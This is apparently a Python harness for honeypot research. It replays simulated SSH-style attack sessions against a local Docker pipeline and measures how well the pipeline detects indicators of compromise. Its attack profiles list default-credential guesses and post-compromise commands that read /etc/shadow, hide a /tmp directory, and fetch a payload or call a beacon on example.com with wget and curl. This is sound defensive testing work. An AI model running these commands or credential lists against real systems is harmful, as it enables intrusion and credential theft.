#!/usr/bin/env python3
"""
Ventana de Observación Prolongada — M3
---------------------------------------
Ejecuta sesiones variadas de attack_simulator.py durante varios días
y registra cada ejecución en una bitácora para medición de P3/P4.

Uso:
  python scripts/m3_ventana_prolongada.py [--sessions-per-day 3] [--days 7]

Requiere: Docker Desktop corriendo, attack_simulator.py funcional.
"""

import sys
sys.stdout.reconfigure(encoding="utf-8")

import os
import json
import time
import subprocess
import random
from datetime import datetime, timedelta
from pathlib import Path

# ── Configuración ──────────────────────────────────────────────
COMPOSE_DIR = Path(__file__).resolve().parent.parent
BITACORA_FILE = COMPOSE_DIR / "evidencia" / "bitacora_m3.jsonl"
RESUMEN_FILE = COMPOSE_DIR / "evidencia" / "resumen_m3.json"

SESSIONS_PER_DAY = int(os.getenv("SESSIONS_PER_DAY", "3"))
TOTAL_DAYS = int(os.getenv("TOTAL_DAYS", "7"))
DRY_RUN = os.getenv("DRY_RUN", "0") == "1"  # DRY_RUN=1 solo planifica, no ejecuta

# ── Perfiles de ataque variados ────────────────────────────────
ATTACK_PROFILES = [
    {
        "name": "brute_force_admin",
        "env": {
            "FAILED_ATTEMPTS": "admin:123456|admin:admin|root:toor|user:user",
            "SUCCESS_ATTEMPT": "admin:test123",
            "COMMANDS": "whoami|uname -a|cat /etc/passwd|ls -la /home|w|exit"
        }
    },
    {
        "name": "credential_stuffing",
        "env": {
            "FAILED_ATTEMPTS": "administrator:password|guest:guest|test:test|oracle:oracle",
            "SUCCESS_ATTEMPT": "admin:test123",
            "COMMANDS": "id|netstat -an|ps aux|cat /etc/shadow|wget http://example.com/payload|exit"
        }
    },
    {
        "name": "no_auth_success",
        "env": {
            "FAILED_ATTEMPTS": "root:123456|admin:qwerty",
            "SUCCESS_ATTEMPT": "",
            "COMMANDS": ""
        }
    },
    {
        "name": "post_exploitation",
        "env": {
            "FAILED_ATTEMPTS": "hacker:hack",
            "SUCCESS_ATTEMPT": "admin:test123",
            "COMMANDS": "whoami|id|uname -a|cat /etc/passwd|cat /etc/shadow|ls -la /home|ls -la /tmp|netstat -an|ps aux|df -h|w|chmod 777 /tmp|mkdir /tmp/.hidden|curl http://example.com/beacon|exit"
        }
    },
    {
        "name": "recon_only",
        "env": {
            "FAILED_ATTEMPTS": "admin:admin|root:root|test:1234",
            "SUCCESS_ATTEMPT": "admin:test123",
            "COMMANDS": "whoami|uname -a|hostname|ip addr|ifconfig|cat /etc/os-release|ls -la /|w|exit"
        }
    },
    {
        "name": "minimal_failed",
        "env": {
            "FAILED_ATTEMPTS": "admin:wrong",
            "SUCCESS_ATTEMPT": "admin:test123",
            "COMMANDS": "ls|pwd|exit"
        }
    },
    {
        "name": "multi_user_enum",
        "env": {
            "FAILED_ATTEMPTS": "admin:test|root:test|user:test|guest:test|test:test|oracle:test|mysql:test|postgres:test",
            "SUCCESS_ATTEMPT": "admin:test123",
            "COMMANDS": "whoami|id|cat /etc/passwd|exit"
        }
    },
]


def log(msg: str):
    ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    print(f"[{ts}] {msg}")


def run_attack(profile: dict, session_num: int, day: int) -> dict:
    """Ejecuta una sesión de ataque con el perfil dado y retorna el resultado."""
    env = os.environ.copy()
    env.update(profile["env"])

    log(f"  Perfil: {profile['name']}")

    try:
        result = subprocess.run(
            [sys.executable, str(COMPOSE_DIR / "scripts" / "attack_simulator.py")],
            capture_output=True,
            text=True,
            cwd=str(COMPOSE_DIR),
            env=env,
            timeout=120
        )
        success = result.returncode == 0
        output_lines = len(result.stdout.splitlines()) if result.stdout else 0
        log(f"  Resultado: {'OK' if success else f'ERROR (rc={result.returncode})'} ({output_lines} líneas)")
        return {
            "success": success,
            "returncode": result.returncode,
            "output_lines": output_lines,
            "stderr_preview": (result.stderr or "")[:200]
        }
    except subprocess.TimeoutExpired:
        log(f"  Resultado: TIMEOUT (120s)")
        return {"success": False, "returncode": -1, "output_lines": 0, "stderr_preview": "timeout"}
    except Exception as e:
        log(f"  Resultado: EXCEPTION ({e})")
        return {"success": False, "returncode": -2, "output_lines": 0, "stderr_preview": str(e)[:200]}


def query_postgres(sql: str) -> str:
    """Ejecuta una query SQL contra PostgreSQL via docker compose."""
    try:
        result = subprocess.run(
            ["docker", "compose", "exec", "-T", "postgres", "psql", "-U", "honeypot", "-d", "honeypot", "-t", "-A", "-c", sql],
            capture_output=True,
            text=True,
            cwd=str(COMPOSE_DIR),
            timeout=30
        )
        return result.stdout.strip()
    except Exception as e:
        return f"ERROR: {e}"


def collect_metrics() -> dict:
    """Recolecta métricas actuales de PostgreSQL."""
    metrics = {}

    r = query_postgres("SELECT COUNT(DISTINCT session) FROM events;")
    metrics["total_sesiones"] = int(r) if r.isdigit() else 0

    r = query_postgres("SELECT COUNT(*) FROM events;")
    metrics["total_eventos"] = int(r) if r.isdigit() else 0

    r = query_postgres("SELECT COUNT(*) FROM iocs;")
    metrics["total_iocs"] = int(r) if r.isdigit() else 0

    r = query_postgres("SELECT COUNT(*) FROM reports;")
    metrics["total_reportes"] = int(r) if r.isdigit() else 0

    # Sesiones con IoC de comando (P3)
    r = query_postgres("""
        SELECT COUNT(DISTINCT e.session)
        FROM events e
        JOIN iocs i ON i.event_id = e.id
        WHERE i.type = 'command';
    """)
    metrics["sesiones_con_ioc_command"] = int(r) if r.isdigit() else 0

    # Sesiones con cualquier IoC (P3 amplio)
    r = query_postgres("""
        SELECT COUNT(DISTINCT e.session)
        FROM events e
        JOIN iocs i ON i.event_id = e.id;
    """)
    metrics["sesiones_con_ioc_any"] = int(r) if r.isdigit() else 0

    # IPs únicas
    r = query_postgres("SELECT COUNT(DISTINCT src_ip) FROM events;")
    metrics["ips_unicas"] = int(r) if r.isdigit() else 0

    # Países (si la columna existe)
    r = query_postgres("SELECT COUNT(DISTINCT country) FROM events WHERE country IS NOT NULL;")
    metrics["paises_distintos"] = int(r) if r.isdigit() else 0

    return metrics


def write_bitacora(entry: dict):
    """Append una entrada a la bitácora JSONL."""
    BITACORA_FILE.parent.mkdir(parents=True, exist_ok=True)
    with open(BITACORA_FILE, "a", encoding="utf-8") as f:
        f.write(json.dumps(entry, ensure_ascii=False) + "\n")


def main():
    log("=" * 60)
    log("M3 — VENTANA DE OBSERVACIÓN PROLONGADA")
    log(f"  Sesiones por día: {SESSIONS_PER_DAY}")
    log(f"  Días totales: {TOTAL_DAYS}")
    log(f"  Perfiles disponibles: {len(ATTACK_PROFILES)}")
    log(f"  Modo: {'DRY RUN (sin ejecutar)' if DRY_RUN else 'EJECUCIÓN REAL'}")
    log("=" * 60)

    # Verificar que el pipeline está corriendo
    if not DRY_RUN:
        r = query_postgres("SELECT 1;")
        if r != "1":
            log("ERROR: No se puede conectar a PostgreSQL. ¿Docker está corriendo?")
            sys.exit(1)
        log("PostgreSQL: OK")

    total_sessions = SESSIONS_PER_DAY * TOTAL_DAYS
    profiles_cycle = ATTACK_PROFILES.copy()
    random.shuffle(profiles_cycle)

    session_count = 0
    all_entries = []

    for day in range(1, TOTAL_DAYS + 1):
        log(f"\n{'─' * 40}")
        log(f"DÍA {day}/{TOTAL_DAYS}")
        log(f"{'─' * 40}")

        for session_num in range(1, SESSIONS_PER_DAY + 1):
            session_count += 1
            profile = profiles_cycle[(session_count - 1) % len(profiles_cycle)]

            log(f"\n  Sesión {session_count}/{total_sessions} (día {day}, sesión {session_num})")

            entry = {
                "timestamp": datetime.now().isoformat(),
                "day": day,
                "session_num": session_num,
                "global_num": session_count,
                "profile": profile["name"],
                "dry_run": DRY_RUN
            }

            if not DRY_RUN:
                result = run_attack(profile, session_num, day)
                entry["result"] = result

                # Esperar a que el pipeline procese
                log("  Esperando 5s para pipeline...")
                time.sleep(5)

                # Recolectar métricas
                metrics = collect_metrics()
                entry["metrics"] = metrics
                log(f"  Métricas: {metrics['total_eventos']} eventos, {metrics['total_iocs']} iocs, {metrics['total_sesiones']} sesiones")
            else:
                entry["result"] = {"dry_run": True}
                entry["metrics"] = {}

            write_bitacora(entry)
            all_entries.append(entry)

            # Pausa entre sesiones (2-5 minutos aleatorio)
            if session_count < total_sessions and not DRY_RUN:
                pause = random.randint(120, 300)
                log(f"  Pausa: {pause // 60}m {pause % 60}s")
                time.sleep(pause)

    # Resumen final
    log(f"\n{'=' * 60}")
    log("RESUMEN M3")
    log(f"{'=' * 60}")

    if not DRY_RUN:
        final_metrics = collect_metrics()
        log(f"  Total eventos: {final_metrics['total_eventos']}")
        log(f"  Total sesiones: {final_metrics['total_sesiones']}")
        log(f"  Total IoCs: {final_metrics['total_iocs']}")
        log(f"  Total reportes: {final_metrics['total_reportes']}")
        log(f"  Sesiones con IoC comando: {final_metrics['sesiones_con_ioc_command']}")
        log(f"  Sesiones con IoC cualquiera: {final_metrics['sesiones_con_ioc_any']}")
        log(f"  IPs únicas: {final_metrics['ips_unicas']}")
        log(f"  Países distintos: {final_metrics['paises_distintos']}")

        # Calcular P3 y P4
        if final_metrics["total_sesiones"] > 0:
            p3_amplio = (final_metrics["sesiones_con_ioc_any"] / final_metrics["total_sesiones"]) * 100
            p3_comando = (final_metrics["sesiones_con_ioc_command"] / final_metrics["total_sesiones"]) * 100
            log(f"\n  P3 (IoC amplio): {p3_amplio:.1f}% ({final_metrics['sesiones_con_ioc_any']}/{final_metrics['total_sesiones']})")
            log(f"  P3 (IoC comando): {p3_comando:.1f}% ({final_metrics['sesiones_con_ioc_command']}/{final_metrics['total_sesiones']})")

        # Wilson IC 95% para P3
        n = final_metrics["sesiones_con_ioc_any"]
        N = final_metrics["total_sesiones"]
        if N > 0:
            p = n / N
            z = 1.96
            denom = 1 + z**2 / N
            center = (p + z**2 / (2*N)) / denom
            spread = z * ((p*(1-p) + z**2/(4*N)) / N) ** 0.5 / denom
            wilson_low = max(0, (center - spread) * 100)
            wilson_high = min(100, (center + spread) * 100)
            log(f"  P3 IC 95% Wilson: [{wilson_low:.1f}%, {wilson_high:.1f}%]")

        resumen = {
            "execution_date": datetime.now().isoformat(),
            "total_days": TOTAL_DAYS,
            "sessions_per_day": SESSIONS_PER_DAY,
            "total_sessions_executed": session_count,
            "final_metrics": final_metrics,
        }
        with open(RESUMEN_FILE, "w", encoding="utf-8") as f:
            json.dump(resumen, f, indent=2, ensure_ascii=False)
        log(f"\n  Resumen guardado en: {RESUMEN_FILE}")
    else:
        log("  DRY RUN completado — sin ejecuciones reales")

    log(f"  Bitácora: {BITACORA_FILE}")
    log(f"  Total sesiones planificadas: {session_count}")
    log("")


if __name__ == "__main__":
    main()
